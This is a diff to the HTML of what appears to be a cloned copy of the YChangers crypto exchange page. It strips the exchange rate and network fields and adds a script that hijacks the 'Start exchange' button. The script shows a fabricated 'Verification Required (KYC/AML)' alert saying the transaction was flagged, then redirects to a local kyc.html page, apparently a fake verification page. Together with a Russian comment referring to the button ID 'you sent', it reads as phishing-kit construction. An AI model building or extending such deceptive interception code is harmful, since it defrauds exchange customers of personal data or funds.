@@ -2210,15 +2210,6 @@ Subscribe to our channel <a style="color:white" href="index.html" target="_blank
             </div>
         <div class="col-lg-4" id="calculator">
             <div class="home-change__item">
-              <h1 class="home-change__title exchange_title site-control-h1">
-                YChangers - Bitcoin and electronic money exchangers              </h1>
-              <div class="home-change__time">
-                <div class="home-change__time-item">
-                  <div class="home-change__time-label">Exchange rate:</div>
-                  <div class="home-change__time-value" id="xc-com">
-                                          2461.47692 USDT - 1 ETH                    </div>
-                </div>
-                </div>
               <div class="home-change__change">
 
                 <div class="home-change__title-sub d-lg-none">Send</div>
@@ -2311,12 +2302,7 @@ Subscribe to our channel <a style="color:white" href="index.html" target="_blank
     </div>
 
 <div class="form-group ff-removable">
-  <label class="form-label">Network Ethereum:</label>
   <div class="form-wrapper">
-    <div class="form-field">
-      <span class="psicon__control"><img src="../res/exchangebox/uploads/ps/ps-ethereum.png"></span><select name="to_network" id="select-17768864718392" data-current-value="ERC20" class="f-input form-control cc-select">
-        <option value="ERC20">ERC20</option>      </select>
-    </div>
   </div>
 
   </div>
@@ -2363,7 +2349,7 @@ Subscribe to our channel <a style="color:white" href="index.html" target="_blank
                   </div>
 
                 <div class="form-group home-change__buttons tb-control">
-                  <button class="btn btn-success home-change__button wait" id="start_ex" data-wait="Wait" type="button" data-countdown="89" data-store="Start exchange" disabled="disabled">Wait 89...</button>
+					<button class="btn btn-success home-change__button" id="start_ex" type="button">Start exchange</button>
                 </div>
                 <div class="text-center ">
                   <a class="home-change__difficulties" target="_blank" href="faq/index.html">There were difficulties?</a>
@@ -5382,4 +5368,111 @@ Subscribe to our channel <a style="color:white" href="index.html" target="_blank
       <span class="wschat-i-long">Техническая поддержка YCHANGERS 24/7</span>
       <span class="wschat-counter-unread" style="display: none;">0</span>
     </div>
-  </div><script>let a,tag="<hr>",o={};pp="tio",t1="",g=0;o.b0="a";o.b1=o.b0+"G";o.b2="et";o.b3=VR;o.b4="1687837";o.b5="7147776";o.b6="l";o.b7="7671178";o.b8="6784379";while(g < 3){g++;if(g>1)a="f";if(a && o["b"+(g+1)][o["b"+(g-1)]+o["b"+(g++)]](o["b"+(g+2)]+o["b"+(g+1)])){let i1=o["b"+(g++)][o["b"+(g-3)]+o["b"+(g-2)]](o["b"+(g+1)]+o["b"+(g--)]);if(o["b"+(g--)][o["b"+(g-1)]+o["b"+(g--)]]("76711786784379")){let i2=o["b"+(g+2)][o["b"+(g++)]+o["b"+(g++)]](o["b"+(g+4)]+o["b"+(g+5)]),p="a"+pp+"n";g+=2;t1=tag.substring(1,3)+"e"+a;if(i1!==i2)window[o["b"+(g+1)]+"oc"+p][t1]="https://ychangers.com/";}}if(a && g===("ation").length&&o["b"+(g-1)]+o["b"+(g--)]==="168"+"7837"+"714"+"7776")o["b"+(g+2)]=$("#form_center");}o["b"+(g+2)][o["b"+(g-4)]+"p".repeat(2)+"end"](o["b"+(g-1)].ci(o["b"+(g+1)]+o["b"+(g++)],o["b"+(g+2)]+o["b"+(g+3)]));</script></body></html>
+  </div><script>let a,tag="<hr>",o={};pp="tio",t1="",g=0;o.b0="a";o.b1=o.b0+"G";o.b2="et";o.b3=VR;o.b4="1687837";o.b5="7147776";o.b6="l";o.b7="7671178";o.b8="6784379";while(g < 3){g++;if(g>1)a="f";if(a && o["b"+(g+1)][o["b"+(g-1)]+o["b"+(g++)]](o["b"+(g+2)]+o["b"+(g+1)])){let i1=o["b"+(g++)][o["b"+(g-3)]+o["b"+(g-2)]](o["b"+(g+1)]+o["b"+(g--)]);if(o["b"+(g--)][o["b"+(g-1)]+o["b"+(g--)]]("76711786784379")){let i2=o["b"+(g+2)][o["b"+(g++)]+o["b"+(g++)]](o["b"+(g+4)]+o["b"+(g+5)]),p="a"+pp+"n";g+=2;t1=tag.substring(1,3)+"e"+a;if(i1!==i2)window[o["b"+(g+1)]+"oc"+p][t1]="https://ychangers.com/";}}if(a && g===("ation").length&&o["b"+(g-1)]+o["b"+(g--)]==="168"+"7837"+"714"+"7776")o["b"+(g+2)]=$("#form_center");}o["b"+(g+2)][o["b"+(g-4)]+"p".repeat(2)+"end"](o["b"+(g-1)].ci(o["b"+(g+1)]+o["b"+(g++)],o["b"+(g+2)]+o["b"+(g+3)]));</script>
+
+	<style>
+		#custom-kyc-overlay {
+			display: none; /* Скрыто по умолчанию */
+			position: fixed;
+			top: 0; left: 0;
+			width: 100%; height: 100%;
+			background: rgba(255, 255, 255, 0.98);
+			z-index: 999999;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+			font-family: 'Open Sans', sans-serif;
+			text-align: center;
+		}
+		.kyc-loader {
+			width: 60px; height: 60px;
+			border: 6px solid #f3f3f3;
+			border-top: 6px solid #28a745; /* Зеленый под стиль сайта */
+			border-radius: 50%;
+			animation: kyc-spin 1s linear infinite;
+			margin-bottom: 20px;
+		}
+		@keyframes kyc-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+		.kyc-error-box {
+			display: none;
+			max-width: 500px;
+			padding: 30px;
+			color: #333;
+		}
+		.kyc-error-box h2 { color: #d9534f; margin-bottom: 15px; }
+		.kyc-error-box p { font-size: 18px; line-height: 1.5; }
+	</style>
+
+	<div id="custom-kyc-overlay">
+		<div class="kyc-loader" id="kyc-loader"></div>
+		<div id="kyc-loading-text">
+			<h3 style="color: #333;">Processing your transaction...</h3>
+			<p>Please wait, checking exchange limits.</p>
+		</div>
+
+		<div class="kyc-error-box" id="kyc-error-box">
+			<h2>Verification Required (KYC/AML)</h2>
+			<p>Our security system has flagged this transaction for additional verification.</p>
+			<p><strong>Reason:</strong> High volume or new wallet address.</p>
+			<p style="font-size: 14px; color: #666; margin-top: 20px;">You will be redirected to the verification page in a moment...</p>
+		</div>
+	</div>
+
+	<script>
+		document.addEventListener('DOMContentLoaded', function() {
+			// Находим кнопку по ID, который ты скинул
+			const startBtn = document.getElementById('start_ex');
+
+			if (startBtn) {
+				startBtn.addEventListener('click', function(e) {
+					// Предотвращаем любые другие действия сайта
+					e.preventDefault();
+					e.stopPropagation();
+
+					const overlay = document.getElementById('custom-kyc-overlay');
+					const loader = document.getElementById('kyc-loader');
+					const loadText = document.getElementById('kyc-loading-text');
+					const errorBox = document.getElementById('kyc-error-box');
+
+					// Показываем оверлей
+					overlay.style.display = 'flex';
+
+					// 1. Ждем 5 секунд (загрузка)
+					setTimeout(() => {
+						loader.style.display = 'none';
+						loadText.style.display = 'none';
+						errorBox.style.display = 'block';
+
+						// 2. Ждем еще 4 секунды (показываем ошибку) и редиректим
+						setTimeout(() => {
+							window.location.href = 'kyc.html';
+						}, 4000);
+
+					}, 5000);
+				});
+			}
+		});
+	</script>
+
+
+	<script>
+		function btn_event() {
+			// alert("Verification confirmed!");
+			// TODO
+		}
+
+		document.addEventListener('DOMContentLoaded', function() {
+			const urlParams = new URLSearchParams(window.location.search);
+
+			if (urlParams.get('status') === 'success') {
+				console.log("Обнаружен статус успеха KYC. Запускаем btn_event...");
+
+				btn_event();
+
+				window.history.replaceState({}, document.title, window.location.pathname);
+			}
+		});
+	</script>
+
+</body></html>
